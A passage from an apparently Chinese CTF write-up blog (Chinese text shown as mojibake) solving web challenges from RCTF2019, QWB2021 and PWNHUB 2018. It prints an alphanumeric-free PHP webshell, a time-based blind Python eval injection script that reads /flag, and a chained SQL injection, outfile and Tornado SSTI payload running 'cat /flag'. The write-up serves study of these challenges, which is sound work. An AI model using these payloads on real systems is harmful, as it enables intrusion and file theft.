&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$harden&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$harden_filter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$harden_filter&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$dir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">// Sanitize feature is available starting from the medium level //
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>$filename&lt;/code>å•ç‹¬ç»è¿‡wafä¹‹åŽå¾—åˆ°çš„æ–‡ä»¶è·¯å¾„&lt;code>$read_file_with_hardened_filter&lt;/code>å¿…é¡»å’Œä¹‹å‰çš„&lt;code>$read_file&lt;/code>ä¸åŒï¼Œè¯»åˆ°çš„æ–‡ä»¶å†…å®¹ä¹Ÿå¿…é¡»ä¸åŒ&lt;/p>
&lt;p>postçš„åœ°æ–¹ç”¨çš„æ˜¯Putç±»ï¼Œå¤§å·®ä¸å·®ï¼Œå¤šäº†ä¸ªå¯¹codeçš„wafï¼Œ&lt;code>code_sanitizer&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">code_sanitizer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75715e">// Computer-chan, please don&amp;#39;t speak english. Speak something else! //
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">preg_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/[^&amp;lt;&amp;gt;!@#$%\^&amp;amp;*\_?+\.\-&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">\&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">\=\(\)\[\]\;]/u&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*Nope*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ­£å¸¸linuxä¸‹å†™å…¥&lt;code>test&lt;/code>æ–‡ä»¶ï¼ŒåŒ…å«&lt;code>test\&lt;/code>ï¼Œç»è¿‡wafä¹‹åŽå¾—åˆ°&lt;code>./files/test&lt;/code>ï¼Œä½†æ˜¯å¤„ç†å‰çš„&lt;code>./files/test\&lt;/code>æ— æ³•è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¤±è´¥&lt;/p>
&lt;p>è¿™é‡Œç”¨åˆ°çš„trickæ˜¯windowsä¸‹æ‰§è¡Œ&lt;code>file_get_contents&lt;/code>æ—¶ä¼šæŠŠ&lt;code>&amp;quot;&lt;/code>è§£é‡Šä¸º&lt;code>.&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>file_get_contents('test.php') === file_get_contents('test&amp;quot;php')
&lt;/code>&lt;/pre>&lt;p>åˆ©ç”¨è¿™ä¸ªtrickï¼Œä¸Šä¼ æ–‡ä»¶åä¸º&lt;code>test&lt;/code>ï¼Œè¯»å–æ–‡ä»¶åä¸º&lt;code>&amp;quot;/test&lt;/code>ï¼Œè¿‡wafåŽè·¯å¾„ä¸º&lt;code>./files/.test&lt;/code>ï¼Œå¤„ç†å‰è·¯å¾„ä¸º&lt;code>./files/./test&lt;/code>ï¼Œå¯ä»¥æ­£å¸¸è¯»å–æ–‡ä»¶å†…å®¹&lt;/p>
&lt;p>å…³äºŽshellï¼Œç»§ç»­ç”¨pç‰›çš„è¿™ç¯‡&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?=$_=[];$_=&amp;quot;$_&amp;quot;;$_=$_[(&amp;quot;!&amp;quot;==&amp;quot;!&amp;quot;)+(&amp;quot;!&amp;quot;==&amp;quot;!&amp;quot;)+(&amp;quot;!&amp;quot;==&amp;quot;!&amp;quot;)];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$_;$___++;$___++;$___++;$___++;$____=$_;$_____=$_;$_____++;$_____++;$_____++;$______=$_;$______++;$______++;$______++;$______++;$______++;$__=$__.$___.$____.$_____.$______;$___=$_;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$__=$__.$___.$____.$_____;$___=$_;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$______=$_;$______++;$______++;$______++;$______++;$______++;$______++;$___=$___.$____.$_____.$______;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$___=$___.'.'.$____.$_____.$____;$__($___);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>æ³¨æ„å¯¹&lt;code>+&lt;/code>è¿›è¡Œurlç¼–ç &lt;/p>
&lt;p>flag{f5bf0f29-bb51-4f28-b9ee-d9ef9b1e3915}&lt;/p>
&lt;p>â€”â€”â€”â€”ä¹‹åŽçœ‹æ›´å¤šå¸ˆå‚…ä»¬çš„wpï¼Œå‘çŽ°ç”±äºŽæ˜¯winçš„çŽ¯å¢ƒè¿˜å¯ä»¥æœ‰åˆ«çš„trickæ¥åˆ©ç”¨&lt;/p>
&lt;p>winä¸‹æœ‰ç£ç›˜æµåˆ›å»ºç›®å½•çš„æ–¹å¼&lt;/p>
&lt;p>&lt;img src="https://cdn.nlark.com/yuque/0/2019/png/298354/1572187075689-2a8c066f-5c30-4f23-9f1f-fd564d4f87f1.png#align=left&amp;amp;display=inline&amp;amp;height=208&amp;amp;name=%E5%9B%BE%E7%89%87.png&amp;amp;originHeight=415&amp;amp;originWidth=900&amp;amp;size=248114&amp;amp;status=done&amp;amp;width=450" alt="å›¾ç‰‡.png">&lt;/p>
&lt;p>å½“&lt;code>file_put_contents&lt;/code>ä¼ å…¥çš„æ–‡ä»¶åä¸º&lt;code>amiz::$INDEX_ALLOCATION&lt;/code>æ—¶ å°±ä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º&lt;code>amiz&lt;/code>çš„æ–‡ä»¶å¤¹ï¼Œå†…å®¹ä¸ºç©º&lt;/p>
&lt;p>æˆ‘ä»¬å…ˆç”¨putåˆ›å»ºæ–‡ä»¶å¤¹ï¼Œå†putå‘è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹å†™shellï¼Œæœ€åŽåŒ…å«è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„shellå°±å¯ä»¥äº†&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://nikoeurus.github.io/2019/11/04/lfi2019/">wp1&lt;/a> | &lt;a href="https://evoa.me/archives/13/">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
*[RCTF2019]calcalcalc
&lt;/h4>
&lt;/summary>
&lt;p>ç»™äº†æºç ï¼Œç¦»è°±ï¼Œæœ‰3ä¸ªè¯­è¨€çš„åŽç«¯ï¼Œpho nodejs python&amp;hellip;&amp;hellip;..&lt;/p>
&lt;p>å…ˆçœ‹å‰ç«¯ï¼Œfrontend/views/index.hbs&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120113421152.png" alt="image-20220120113421152">&lt;/p>
&lt;p>ä¼špostæ–¹å¼è¯·æ±‚&lt;code>/calculate&lt;/code>ï¼Œä½†å¥½åƒä¹Ÿç®—ä¸äº†å•¥ä¸œè¥¿ï¼Œè¿”å›ž201ï¼Œç„¶åŽæ˜¯frontend/src/app.controller.ts&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114124197.png" alt="image-20220120114124197">&lt;/p>
&lt;p>æœ‰ä¸€è¯´ä¸€tsæˆ‘çœ‹èµ·æ¥å¥½è´¹åŠ²â€¦â€¦å®ƒè¿˜æ¶‰åŠåˆ°å¦å¤–ä¸¤ä¸ªæ–‡ä»¶ï¼Œcalculate.model.ts&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114423330.png" alt="image-20220120114423330">&lt;/p>
&lt;p>å…¶ä¸­ç”¨åˆ°çš„&lt;code>@ExpressionValidator&lt;/code>ï¼Œexpresssion.validator.ts&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114452545.png" alt="image-20220120114452545">&lt;/p>
&lt;p>å¦‚æžœ18è¡Œçš„&lt;code>isVip&lt;/code>ä¸ºfalseï¼Œå°±ä¼šåˆ¤æ–­é•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æŽ¥ä¼ å…¥jsonï¼Œè®¾å®ƒä¸ºtrue&lt;/p>
&lt;p>ä¸‰ä¸ªåŽç«¯éƒ½ä¼šå¯¹æˆ‘ä»¬è¯·æ±‚çš„å¼å­è¿›è¡Œè¿ç®—ï¼Œä½†åªæœ‰ä¸‰ä¸ªè¿”å›žç»“æžœä¸€è‡´æ—¶æ‰å¯ä»¥é€šè¿‡&lt;/p>
&lt;p>Pythonçš„åŽç«¯æœ‰å¤„ç†postè¯·æ±‚çš„éƒ¨åˆ†ï¼Œbackend-python/src/app.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120113740173.png" alt="image-20220120113740173">&lt;/p>
&lt;p>ä¼šå°†è¯·æ±‚çš„&lt;code>expression&lt;/code>å‚æ•°è¿›è¡Œjsonå¤„ç†åŽ&lt;code>eval&lt;/code>ï¼Œé‚£å…¥æ‰‹ç‚¹å°±åœ¨è¿™é‡Œäº†ï¼›ä½†æ˜¯13è¡Œçš„è§„åˆ™æ¯”è¾ƒä¸¥è‹›ï¼Œæˆ‘ä»¬é‡‡ç”¨&lt;code>chr()&lt;/code>çš„æ–¹å¼ç»•è¿‡&lt;/p>
&lt;p>ä½†æ˜¯ç”±äºŽå®ƒæ²¡æœ‰æ˜Žç¡®çš„å›žæ˜¾ï¼Œå¹¶ä¸”åŽç«¯å¤„äºŽå†…ç½‘ä¸­ä¸èƒ½å¤–å¸¦æ•°æ®ï¼Œæ‰€ä»¥é‡‡ç”¨æ—¶é—´ç›²æ³¨çš„æ€æƒ³ï¼Œé…åˆäºŒåˆ†çš„è„šæœ¬æ‹¿flag&lt;/p>
&lt;p>*ç”±äºŽbuuojçš„å†…ç½‘çŽ¯å¢ƒé—®é¢˜ï¼Œè¿™é‡Œåšä¸äº†ï¼Œæ‰€ä»¥åªå†™ä¸€ä¸‹è„šæœ¬ï¼Œç­‰å•¥æ—¶å€™ä¿®å¤äº†å†å›žæ¥åšï¼ˆè„šæœ¬å‚è€ƒguokeå¸ˆå‚…çš„ï¼ŒäºŒåˆ†æ³•&lt;/p>
&lt;p>æ ¸å¿ƒçš„ç›²æ³¨payloadæ˜¯è¿™ä¸ª&lt;/p>
&lt;pre tabindex="0">&lt;code>__import__('time').sleep(5) if (ord(open('/flag','r').read() [str(i)])&amp;gt;str(mid))else 1
&lt;/code>&lt;/pre>&lt;p>è¦è¿‡wafï¼Œæ‰€ä»¥è½¬ä¸º&lt;code>chr()&lt;/code>çš„å½¢å¼ï¼Œå¤–é¢åŒ…ä¸€å±‚&lt;code>eval&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>import requests
import time
x=''
def getpayload(num,mid):
payload=&amp;quot;__import__('time').sleep(5) if (ord(open('/flag','r').read()[&amp;quot;+str(num)+&amp;quot;])&amp;gt;&amp;quot;+str(mid)+&amp;quot;) else 1&amp;quot;
data=''
for i in payload:
data+='chr('+str(ord(i))+')+'
return('eval('+data[:-1]+')')
url='xxxx/calculate'
for a in range(0,60):
max = 130
min = 30
while max &amp;gt;=min:
mid=(max+min)//2
payload=getpayload(a,mid)
time1=time.time()
r = requests.post(url, json={'isVip': True, 'expression': payload})
time2=time.time()
if (time2-time1&amp;gt;5):
min=mid+1
else:
max=mid
if max==mid==min:
x+=chr(mid)
print(str(a)+':'+x)
break
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="https://skysec.top/2019/05/18/2019-RCTF-Web-Writeup/#%E6%94%BB%E5%87%BB%E6%80%9D%E8%80%83">wp&lt;/a> | &lt;a href="https://guokeya.github.io/post/xUUCnsZ57/">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[QWB2021 Quals]æ‰˜çº³å¤š
&lt;/h4>
&lt;/summary>
&lt;p>æ³¨å†Œè´¦å·ç™»å…¥ï¼Œä½†æ˜¯åªæœ‰adminæ‰æœ‰flagï¼Œé‚£è‚¯å®šå¾—è¦sqliäº†ï¼Œåœ¨ç™»å½•çš„åœ°æ–¹æ³¨äº†åŠå¤©ï¼Œç»“æžœå‘çŽ°æ³¨å…¥ç‚¹åœ¨æ³¨å†Œçš„é¡µé¢ï¼ˆå°´å°¬ï¼‰ï¼Œç›´æŽ¥å•å¼•å·å°±å¯ä»¥é—­åˆ&lt;/p>
&lt;pre tabindex="0">&lt;code>admin'or '1 # å›žæ˜¾this username had been used
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒå®˜æ–¹wpï¼Œè¿™é‡Œç”¨çš„æ˜¯&lt;code>processlist&lt;/code>è¡¨ï¼Œè¿™ä¸ªè¡¨å¾ˆç‰¹åˆ«&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120160515099.png" alt="image-20220120160515099">&lt;/p>
&lt;p>å®ƒè¯»å–æ­£åœ¨æ‰§è¡Œçš„sqlè¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡infoåˆ—æ¥èŽ·å¾—å½“å‰çš„è¡¨ååˆ—åï¼Œè¿˜æ˜¯ç”¨ç¥–ä¼ çš„äºŒåˆ†æ³•æ¥çˆ†adminçš„å¯†ç &lt;/p>
&lt;p>ï¼ˆå°´å°¬çš„æ˜¯çˆ†ä¸€ä¼šå„¿å°±å¯„äº†ï¼Œå®³ï¼Œå¯„å¯„å¯„&lt;/p>
&lt;p>æŒ‰ç…§é¢„æœŸè§£ï¼Œç™»å…¥åŽå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»&lt;code>/proc/self/cmdline&lt;/code>å¯ä»¥çœ‹åˆ°&lt;code>python3 /qwb/app/app.py&lt;/code>ï¼Œæ— æ³•ç›´æŽ¥è¯»app.pyï¼Œä½†æ˜¯å¯ä»¥è¯»pyc&lt;/p>
&lt;p>httpçš„å“åº”å¤´ä¸­æœ‰tornadoçš„ç‰ˆæœ¬å·6.0.3ï¼Œå¯¹åº”çš„python&amp;gt;=3.5ï¼Œçˆ†ç ´ä¸€ä¸‹pycçš„åç§°ï¼Œå¾—åˆ°pyc&lt;/p>
&lt;pre tabindex="0">&lt;code>/qwbimage.php?qwb_image_name=/qwb/app/__pycache__/app.cpython-35.pyc
&lt;/code>&lt;/pre>&lt;p>uncompyle6åç¼–è¯‘å¾—åˆ°æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>import tornado.ioloop, tornado.web, tornado.options, pymysql, os, re
settings = {'static_path': os.path.join(os.getcwd(), 'static'),
'cookie_secret': 'b93a9960-bfc0-11eb-b600-002b677144e0'}
db_username = 'root'
db_password = 'xxxx'
class MainHandler(tornado.web.RequestHandler):
def get(self):
user = self.get_secure_cookie('user')
if user and user == b'admin':
self.redirect('/admin.php', permanent=True)
return
self.render('index.html')
class LoginHandler(tornado.web.RequestHandler):
def get(self):
username = self.get_argument('username', '')
password = self.get_argument('password', '')
if not username or not password:
if not self.get_secure_cookie('user'):
self.finish('&amp;lt;script&amp;gt;alert(`please input your password and username`);history.go(-1);&amp;lt;/script&amp;gt;')
return
if self.get_secure_cookie('user') == b'admin':
self.redirect('/admin.php', permanent=True)
else:
self.redirect('/', permanent=True)
else:
conn = pymysql.connect('localhost', db_username, db_password, 'qwb')
cursor = conn.cursor()
cursor.execute('SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s', [username, password])
results = cursor.fetchall()
if len(results) != 0:
if results[0][1] == 'admin':
self.set_secure_cookie('user', 'admin')
cursor.close()
conn.commit()
conn.close()
self.redirect('/admin.php', permanent=True)
return
else:
cursor.close()
conn.commit()
conn.close()
self.finish('&amp;lt;script&amp;gt;alert(`login success, but only admin can get flag`);history.go(-1);&amp;lt;/script&amp;gt;')
return
else:
cursor.close()
conn.commit()
conn.close()
self.finish('&amp;lt;script&amp;gt;alert(`your username or password is error`);history.go(-1);&amp;lt;/script&amp;gt;')
return
class RegisterHandler(tornado.web.RequestHandler):
def get(self):
username = self.get_argument('username', '')
password = self.get_argument('password', '')
word_bans = ['table', 'col', 'sys', 'union', 'inno', 'like', 'regexp']
bans = ['&amp;quot;', '#', '%', '&amp;amp;', ';', '&amp;lt;', '=', '&amp;gt;', '\\', '^', '`', '|', '*', '--', '+']
for ban in word_bans:
if re.search(ban, username, re.IGNORECASE):
self.finish('&amp;lt;script&amp;gt;alert(`error`);history.go(-1);&amp;lt;/script&amp;gt;')
return
for ban in bans:
if ban in username:
self.finish('&amp;lt;script&amp;gt;alert(`error`);history.go(-1);&amp;lt;/script&amp;gt;')
return
if not username or not password:
self.render('register.html')
return
if username == 'admin':
self.render('register.html')
return
conn = pymysql.connect('localhost', db_username, db_password, 'qwb')
cursor = conn.cursor()
try:
cursor.execute(&amp;quot;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser='%s'&amp;quot; % username)
results = cursor.fetchall()
if len(results) != 0:
self.finish('&amp;lt;script&amp;gt;alert(`this username had been used`);history.go(-1);&amp;lt;/script&amp;gt;')
conn.commit()
conn.close()
return
except:
conn.commit()
conn.close()
self.finish('&amp;lt;script&amp;gt;alert(`error`);history.go(-1);&amp;lt;/script&amp;gt;')
return
try:
cursor.execute('insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)', [username, password])
conn.commit()
conn.close()
self.finish(&amp;quot;&amp;lt;script&amp;gt;alert(`success`);location.href='https://amiaaaz.github.io/index.php';&amp;lt;/script&amp;gt;&amp;quot;)
return
except:
conn.rollback()
conn.close()
self.finish('&amp;lt;script&amp;gt;alert(`error`);history.go(-1);&amp;lt;/script&amp;gt;')
return
class LogoutHandler(tornado.web.RequestHandler):
def get(self):
self.clear_all_cookies()
self.redirect('/', permanent=True)
class AdminHandler(tornado.web.RequestHandler):
def get(self):
user = self.get_secure_cookie('user')
if not user or user != b'admin':
self.redirect('/index.php', permanent=True)
return
self.render('admin.html')
class ImageHandler(tornado.web.RequestHandler):
def get(self):
user = self.get_secure_cookie('user')
image_name = self.get_argument('qwb_image_name', 'header.jpeg')
if not image_name:
self.redirect('/', permanent=True)
return
else:
if not user or user != b'admin':
self.redirect('/', permanent=True)
return
if image_name.endswith('.py') or 'flag' in image_name or '..' in image_name:
self.finish(&amp;quot;nonono, you can't read it.&amp;quot;)
return
image_name = os.path.join(os.getcwd() + '/image', image_name)
with open(image_name, 'rb') as (f):
img = f.read()
self.set_header('Content-Type', 'image/jpeg')
self.finish(img)
return
class SecretHandler(tornado.web.RequestHandler):
def get(self):
if len(tornado.web.RequestHandler._template_loaders):
for i in tornado.web.RequestHandler._template_loaders:
tornado.web.RequestHandler._template_loaders[i].reset()
msg = self.get_argument('congratulations', 'oh! you find it')
bans = []
for ban in bans:
if ban in msg:
self.finish('bad hack,go out!')
return
with open('congratulations.html', 'w') as (f):
f.write('&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;congratulations&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;alert(&amp;quot;%s&amp;quot;);location.href=\'/admin.php\';&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;\n' % msg)
f.flush()
self.render('congratulations.html')
if tornado.web.RequestHandler._template_loaders:
for i in tornado.web.RequestHandler._template_loaders:
tornado.web.RequestHandler._template_loaders[i].reset()
def make_app():
return tornado.web.Application([
(
'/index.php', MainHandler),
(
'/login.php', LoginHandler),
(
'/logout.php', LogoutHandler),
(
'/register.php', RegisterHandler),
(
'/admin.php', AdminHandler),
(
'/qwbimage.php', ImageHandler),
(
'/good_job_my_ctfer.php', SecretHandler),
(
'/', MainHandler)], **settings)
if __name__ == '__main__':
app = make_app()
app.listen(8000)
tornado.ioloop.IOLoop.current().start()
print('start')
&lt;/code>&lt;/pre>&lt;p>å¯ä»¥çœ‹åˆ°&lt;code>/good_job_my_ctfer.php&lt;/code>æœ‰sstiï¼Œä½†æ˜¯&lt;code>{{}}&lt;/code>è¢«è¿‡æ»¤ï¼Œåªèƒ½ç”¨&lt;code>{%%}&lt;/code>ï¼Œè¿™é‡Œç”¨åˆ°çš„æ˜¯&lt;code>{%extends %}&lt;/code>ï¼Œå®ƒå¯ä»¥ä¼ é€’ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ä½œä¸ºå‚æ•°ï¼Œå°†å…¶åŒ…å«å¹¶æ¸²æŸ“&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡sqliçš„outfileå†™æ–‡ä»¶ï¼Œç„¶åŽé€šè¿‡sstiåŒ…å« æ¥æ‰§è¡Œè¯»flagçš„å‘½ä»¤&lt;/p>
&lt;pre tabindex="0">&lt;code>/register.php?username=amiz&amp;amp;password={%set return __import__(&amp;quot;os&amp;quot;).popen(&amp;quot;cat /flag&amp;quot;).read()%}
/register.php?username=amiz' into outfile '/var/lib/mysql-files/amiz&amp;amp;password=amiz
/good_job_my_ctfer.php?congratulations={%extends /var/lib/mysql-files/amiz%}
&lt;/code>&lt;/pre>&lt;p>å…ˆé€šè¿‡æ³¨å†ŒæŠŠpayloadå†™åˆ°å¯†ç éƒ¨åˆ†ï¼Œç„¶åŽoutfileåˆ°mysqlçš„é»˜è®¤å¯¼å‡ºç›®å½•&lt;code>/var/lib/mysql-files/&lt;/code>ï¼Œæœ€åŽåŒ…å«&lt;/p>
&lt;p>flag{79d863ac-1fc6-42f6-951a-d3b6f0468b7f}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[PWNHUB å…¬å¼€èµ› 2018]å‚» fufu çš„å·¥ä½œæ—¥
&lt;/h4>
&lt;/summary>
&lt;p>/UploadFile.class.php.bak, /index.php.bak æœ‰å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œä½¿ç”¨phpjiamiè¿›è¡ŒåŠ å¯†ï¼Œæˆ‘ä»¬ç”¨è„šæœ¬è¿›è¡Œè§£å¯†&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
if($_FILES) {
include 'UploadFile.class.php';
$dist = 'upload';
$upload = new UploadFile($dist, 'upfile');
$data = $upload-&amp;gt;upload();
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>&amp;lt;?php
class UploadFile {
public $error = '';
protected $field;
protected $allow_ext;
protected $allow_size;
protected $dist_path;
protected $new_path;
function __construct($dist_path, $field='upfile', $new_name='random', $allow_ext=['gif', 'jpg', 'jpeg', 'png'], $allow_size=102400)
{
$this-&amp;gt;field = $field;
$this-&amp;gt;allow_ext = $allow_ext;
$this-&amp;gt;allow_size = $allow_size;
$this-&amp;gt;dist_path = realpath($dist_path);
if ($new_name === 'random') {
$this-&amp;gt;new_name = uniqid();
} elseif (is_string($new_name)) {
$this-&amp;gt;new_name = $new_name;
} else {
$this-&amp;gt;new_name = null;
}
}
protected function codeToMessage($code)
{
switch ($code) {
case UPLOAD_ERR_INI_SIZE:
$message = &amp;quot;The uploaded file exceeds the upload_max_filesize directive in php.ini&amp;quot;;
break;
case UPLOAD_ERR_FORM_SIZE:
$message = &amp;quot;The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form&amp;quot;;
break;
case UPLOAD_ERR_PARTIAL:
$message = &amp;quot;The uploaded file was only partially uploaded&amp;quot;;
break;
case UPLOAD_ERR_NO_FILE:
$message = &amp;quot;No file was uploaded&amp;quot;;
break;
case UPLOAD_ERR_NO_TMP_DIR:
$message = &amp;quot;Missing a temporary folder&amp;quot;;
break;
case UPLOAD_ERR_CANT_WRITE:
$message = &amp;quot;Failed to write file to disk&amp;quot;;
break;
case UPLOAD_ERR_EXTENSION:
$message = &amp;quot;File upload stopped by extension&amp;quot;;
break;
default:
$message = &amp;quot;Unknown upload error&amp;quot;;
break;
}
return $message;
}
protected function error($info)
{
$this-&amp;gt;error = $info;
return false;
}
public function upload()
{
if(empty($_FILES[$this-&amp;gt;field])) {
return $this-&amp;gt;error('ä¸Šä¼ æ–‡ä»¶ä¸ºç©º');
}
if(is_array($_FILES[$this-&amp;gt;field]['error'])) {
return $this-&amp;gt;error('ä¸€æ¬¡åªèƒ½ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶');
}
if($_FILES[$this-&amp;gt;field]['error'] != UPLOAD_ERR_OK) {
return $this-&amp;gt;error($this-&amp;gt;codeToMessage($_FILES[$this-&amp;gt;field]['error']));
}
$filename = !empty($_POST[$this-&amp;gt;field]) ? $_POST[$this-&amp;gt;field] : $_FILES[$this-&amp;gt;field]['name'];
if(!is_array($filename)) {
$filename = explode('.', $filename);
}
foreach ($filename as $name) {
if(preg_match('#[&amp;lt;&amp;gt;:&amp;quot;/\\|?*.]#is', $name)) {
return $this-&amp;gt;error('æ–‡ä»¶åä¸­åŒ…å«éžæ³•å­—ç¬¦');
}
}
if($_FILES[$this-&amp;gt;field]['size'] &amp;gt; $this-&amp;gt;allow_size) {
return $this-&amp;gt;error('ä½ ä¸Šä¼ çš„æ–‡ä»¶å¤ªå¤§');
}
if(!in_array($filename[count($filename)-1], $this-&amp;gt;allow_ext)) {
return $this-&amp;gt;error('åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶');
}
// ç”¨.åˆ†å‰²æ–‡ä»¶åï¼Œåªä¿ç•™é¦–å°¾ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œé˜²å¾¡Apacheè§£æžæ¼æ´ž
$origin_name = current($filename);
$ext = end($filename);
$new_name = ($this-&amp;gt;new_name ? $this-&amp;gt;new_name : $origin_name) . '.' . $ext;
$target_fullpath = $this-&amp;gt;dist_path . DIRECTORY_SEPARATOR . $new_name;
// åˆ›å»ºç›®å½•
if(!is_dir($this-&amp;gt;dist_path)) {
mkdir($this-&amp;gt;dist_path);
}
if(is_uploaded_file($_FILES[$this-&amp;gt;field]['tmp_name']) &amp;amp;&amp;amp; move_uploaded_file($_FILES[$this-&amp;gt;field]['tmp_name'], $target_fullpath)) {
// Success upload
} elseif (rename($_FILES[$this-&amp;gt;field]['tmp_name'], $target_fullpath)) {
